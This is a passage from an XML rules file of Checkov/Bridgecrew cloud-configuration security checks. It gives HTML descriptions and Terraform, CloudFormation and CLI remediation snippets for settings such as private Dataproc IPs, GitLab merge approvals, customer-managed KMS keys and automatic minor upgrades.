<p>It is not currently possible to edit a running <strong>Dataproc cluster</strong> to remove it's public IPs.</p>
<p>To create a <strong>Dataproc cluster</strong> with only private IPs:</p>
<ol>
<li>Log in to the GCP Console.</li>
<li>Navigate to <a href="https://urldefense.com/v3/__https://console.cloud.google.com/dataproc/clustersAdd__;!!Mt_FR42WkD9csi9Y!PObL5n10Gkw-7w659OQCGsznK2hEIiTF4FRanyTSwxjHt_5T7NWzzLsaA9BnNO6HvFz-$" target="_self">Dataproc</a>.</li>
<li>Select <em>Customize Cluster</em> to view <strong>Network Configuration</strong> settings.</li>
<li>Locate the <em>Internal IP Only</em> section and select the checkbox next to <strong>Configure all instances to have only internal IP addresses</strong></li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>It is not currently possible to edit a running <strong>Dataproc cluster</strong> to remove it's public IPs.</p>
<p>To create a <strong>Dataproc cluster</strong> with only private IPs you need to specify the <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">--no-address</code> flag. As an example:</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">gcloud beta dataproc clusters create my_cluster  \
  --region=us-central1  \
  --no-address
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: google_dataproc_cluster</li>
<li><strong>Field</strong>: internal_ip_only</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_dataproc_cluster" "accelerated_cluster" {
  name   = "my-cluster-with-gpu"
  region = "us-central1"

  cluster_config {
    gce_cluster_config {
      zone = "us-central1-a"
-     internal_ip_only = false
+     internal_ip_only = true
    }

    master_config {
      accelerators {
        accelerator_type  = "nvidia-tesla-k80"
        accelerator_count = "1"
      }
    }
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-gcp-dataproc-cluster-does-not-have-a-public-ip' target='_blank'> https://docs.bridgecrew.io/docs/ensure-gcp-dataproc-cluster-does-not-have-a-public-ip</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-gcp-dataproc-cluster-does-not-have-a-public-ip' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GLB_1</key>
    <name>Ensure Gitlab project merge requests has at least 2 approvals</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gitlab-project-merge-requests-has-less-than-2-approvals"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gitlab-project-merge-requests-has-less-than-2-approvals"></div>Gitlab project merge requests has less than 2 approvals</div><a aria-label="Skip link to Gitlab project merge requests has less than 2 approvals" class="heading-anchor-icon fa fa-anchor" href="#gitlab-project-merge-requests-has-less-than-2-approvals"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>In GitLab, administrators can require that all merge requests receive a specific number of approving reviews before someone merges the pull request into a protected branch. It is also possible to require approving reviews from people with write permissions in the repository or from a designated code owner.</p>
<p>If a collaborator attempts to merge a pull request with pending or rejected reviews into the protected branch, the collaborator will receive an error message.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li>Resource: gitlab_project</li>
<li>Attribute: approvals_before_merge</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "gitlab_project" "example" {
...
+  approvals_before_merge = 2
...
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/merge-requests-do-not-require-two-or-more-approvals-to-merge' target='_blank'> https://docs.bridgecrew.io/docs/merge-requests-do-not-require-two-or-more-approvals-to-merge</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/merge-requests-do-not-require-two-or-more-approvals-to-merge' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_247</key>
    <name>Ensure AWS all data stored in the Elasticsearch domain is encrypted using a Customer Managed Key (CMK)</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="note-all-aws-data-stored-in-the-elasticsearch-domain-is-encrypted-using-a-customer-managed-key-cmk"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-note-all-aws-data-stored-in-the-elasticsearch-domain-is-encrypted-using-a-customer-managed-key-cmk"></div>Note all AWS data stored in the Elasticsearch domain is encrypted using a Customer Managed Key (CMK)</div><a aria-label="Skip link to Note all AWS data stored in the Elasticsearch domain is encrypted using a Customer Managed Key (CMK)" class="heading-anchor-icon fa fa-anchor" href="#note-all-aws-data-stored-in-the-elasticsearch-domain-is-encrypted-using-a-customer-managed-key-cmk"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies Elasticsearch domain which are encrypted with default KMS keys and not with Keys managed by Customer. It is a best practice to use customer managed KMS Keys to encrypt your Elasticsearch domain data. It gives you full control over the encrypted data.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<p>TBD</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_elasticsearch_domain" "pass" {
  domain_name = "example"

  cluster_config {
    instance_type = "r5.large.elasticsearch"
  }

  encrypt_at_rest {
    kms_key_id = aws_kms_key.example.arn
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-all-data-stored-in-the-elasticsearch-domain-is-encrypted-using-a-customer-managed-key-cmk' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-all-data-stored-in-the-elasticsearch-domain-is-encrypted-using-a-customer-managed-key-cmk</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-all-data-stored-in-the-elasticsearch-domain-is-encrypted-using-a-customer-managed-key-cmk' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_221</key>
    <name>Ensure AWS Code Artifact Domain is encrypted by KMS using a Customer Managed Key (CMK)</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-code-artifact-domain-is-not-encrypted-by-kms-using-a-customer-managed-key-cmk"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-code-artifact-domain-is-not-encrypted-by-kms-using-a-customer-managed-key-cmk"></div>AWS Code Artifact Domain is not encrypted by KMS using a Customer Managed Key (CMK)</div><a aria-label="Skip link to AWS Code Artifact Domain is not encrypted by KMS using a Customer Managed Key (CMK)" class="heading-anchor-icon fa fa-anchor" href="#aws-code-artifact-domain-is-not-encrypted-by-kms-using-a-customer-managed-key-cmk"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies Code Artifact Domains which are encrypted with default KMS keys and not with Keys managed by Customer. It is a best practice to use customer managed KMS Keys to encrypt your Code Artifact Domain data. It gives you full control over the encrypted data.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<p>TBD</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_codeartifact_domain" "pass" {
  domain         = "example"
  encryption_key = aws_kms_key.example.arn
  tags = {
    "key" = "value"
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-code-artifact-domain-is-encrypted-by-kms-using-a-customer-managed-key-cmk' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-code-artifact-domain-is-encrypted-by-kms-using-a-customer-managed-key-cmk</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-code-artifact-domain-is-encrypted-by-kms-using-a-customer-managed-key-cmk' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_240</key>
    <name>Ensure AWS Kinesis Firehose's delivery stream is encrypted</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="ensure-aws-kinesis-firehoses-delivery-stream-is-encrypted"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-ensure-aws-kinesis-firehoses-delivery-stream-is-encrypted"></div>Ensure AWS Kinesis Firehose's delivery stream is encrypted</div><a aria-label="Skip link to Ensure AWS Kinesis Firehose's delivery stream is encrypted" class="heading-anchor-icon fa fa-anchor" href="#ensure-aws-kinesis-firehoses-delivery-stream-is-encrypted"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-kinesis-firehoses-delivery-stream-is-encrypted' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-kinesis-firehoses-delivery-stream-is-encrypted</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-kinesis-firehoses-delivery-stream-is-encrypted' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_OPENSTACK_4</key>
    <name>Ensure OpenStack instance does not use basic credentials</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="openstack-instance-uses-basic-credentials"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-open-stack-instance-uses-basic-credentials"></div>OpenStack instance uses basic credentials</div><a aria-label="Skip link to OpenStack instance uses basic credentials" class="heading-anchor-icon fa fa-anchor" href="#openstack-instance-uses-basic-credentials"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>When managing a compute instance in Terraform, you can override the root password using admin_pass. However, this is stored in plaintext and therefore exposes the root password to credential theft.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><em>Resource:</em> openstack_compute_instance_v2</li>
<li><em>Arguments:</em> admin_pass</li>
</ul>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "openstack_compute_instance_v2" "fail" {
  name            = "basic"
  image_id        = "ad091b52-742f-469e-8f3c-fd81cadf0743"
  flavor_id       = "3"
-  admin_pass      = "N0tSoS3cretP4ssw0rd"
  security_groups = ["default"]
  user_data       = "#cloud-config\nhostname: instance_1.example.com\nfqdn: instance_1.example.com"

  network {
    name = "my_network"
  }
}
</code></pre> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-openstack-instance-does-not-use-basic-credentials' target='_blank'> https://docs.bridgecrew.io/docs/ensure-openstack-instance-does-not-use-basic-credentials</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-openstack-instance-does-not-use-basic-credentials' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_ALI_30</key>
    <name>Ensure Alibaba Cloud RDS instance is set to perform auto upgrades for minor versions</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-rds-instance-is-not-set-to-perform-auto-upgrades-for-minor-versions"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-rds-instance-is-not-set-to-perform-auto-upgrades-for-minor-versions"></div>Alibaba Cloud RDS instance is not set to perform auto upgrades for minor versions</div><a aria-label="Skip link to Alibaba Cloud RDS instance is not set to perform auto upgrades for minor versions" class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-rds-instance-is-not-set-to-perform-auto-upgrades-for-minor-versions"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-rds-instance-is-set-to-perform-auto-upgrades-for-minor-versions' target='_blank'> https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-rds-instance-is-set-to-perform-auto-upgrades-for-minor-versions</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-rds-instance-is-set-to-perform-auto-upgrades-for-minor-versions' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_245</key>
    <name>Ensure AWS DMS instance receives all minor updates automatically</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-dms-instance-does-not-receive-all-minor-updates-automatically"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-dms-instance-does-not-receive-all-minor-updates-automatically"></div>AWS DMS instance does not receive all minor updates automatically</div><a aria-label="Skip link to AWS DMS instance does not receive all minor updates automatically" class="heading-anchor-icon fa fa-anchor" href="#aws-dms-instance-does-not-receive-all-minor-updates-automatically"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>When AWS Database Migration Service (AWS DMS) supports a new version, you can upgrade your replication instances to it. There are two kinds of upgrades: major version upgrades and minor version upgrades. Minor upgrades helps maintain a secure and stable DMS with minimal impact on the replication. For this reason, we recommend that your automatic minor upgrade is enabled. Minor version upgrades only occur automatically if a minor upgrade replaces an unsafe version, such as a minor upgrade that contains bug fixes for a previous version.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">aws dms modify-replication-instance \
    --region ${region} \
    --replication-instance-arn ${resource_arn} \
    --auto-minor-version-upgrade \
    --apply-immediately
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:
  Example:
    Type: 'AWS::DMS::ReplicationInstance'
    Properties:
      EngineVersion: 3.1.4
      ReplicationInstanceIdentifier: example
      ReplicationInstanceClass: dms.t2.micro
+     AutoMinorVersionUpgrade: true
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_dms_replication_instance" "example" {
  engine_version               = "3.1.4"
  replication_instance_class   = "dms.t2.micro"
  replication_instance_id      = "example"
+ auto_minor_version_upgrade   = true
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-dms-instance-receives-all-minor-updates-automatically' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-dms-instance-receives-all-minor-updates-automatically</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-dms-instance-receives-all-minor-updates-automatically' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_ALI_41</key>
    <name>Ensure Alibaba Cloud MongoDB is deployed inside a VPC</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-mongodb-is-not-deployed-inside-a-vpc"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-mongo-db-is-not-deployed-inside-a-vpc"></div>Alibaba Cloud MongoDB is not deployed inside a VPC</div><a aria-label="Skip link to Alibaba Cloud MongoDB is not deployed inside a VPC" class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-mongodb-is-not-deployed-inside-a-vpc"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-mongodb-is-deployed-inside-a-vpc' target='_blank'> https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-mongodb-is-deployed-inside-a-vpc</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-mongodb-is-deployed-inside-a-vpc' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_224</key>
    <name>Ensure AWS cluster logging is encrypted using a Customer Managed Key (CMK)</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-cluster-logging-is-not-encrypted-using-a-customer-managed-key-cmk"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-cluster-logging-is-not-encrypted-using-a-customer-managed-key-cmk"></div>AWS cluster logging is not encrypted using a Customer Managed Key (CMK)</div><a aria-label="Skip link to AWS cluster logging is not encrypted using a Customer Managed Key (CMK)" class="heading-anchor-icon fa fa-anchor" href="#aws-cluster-logging-is-not-encrypted-using-a-customer-managed-key-cmk"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies cluster logging which are encrypted with default KMS keys and not with Keys managed by Customer. It is a best practice to use customer managed KMS Keys to encrypt your cluster logging data. It gives you full control over the encrypted data.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<p>TBD</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Text</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-text theme-light" data-lang="text" name="">resource "aws_ecs_cluster" "pass2" {
  name = "white-hart"
  configuration {
    execute_command_configuration {
      kms_key_id = aws_kms_key.example.arn

      log_configuration {
        #        cloud_watch_encryption_enabled = true
        # cloud_watch_log_group_name     = aws_cloudwatch_log_group.example.name

        # or
        # s3_bucket_name=   and
        s3_bucket_encryption_enabled = true
      }
    }
  }
  tags = { test = "fail" }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-cluster-logging-is-encrypted-using-a-customer-managed-key-cmk' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-cluster-logging-is-encrypted-using-a-customer-managed-key-cmk</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-cluster-logging-is-encrypted-using-a-customer-managed-key-cmk' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_17</key>
    <name>Ensure AWS RDS database instance is not publicly accessible</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-rds-database-instance-is-publicly-accessible"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-rds-database-instance-is-publicly-accessible"></div>AWS RDS database instance is publicly accessible</div><a aria-label="Skip link to AWS RDS database instance is publicly accessible" class="heading-anchor-icon fa fa-anchor" href="#aws-rds-database-instance-is-publicly-accessible"></a></h1>
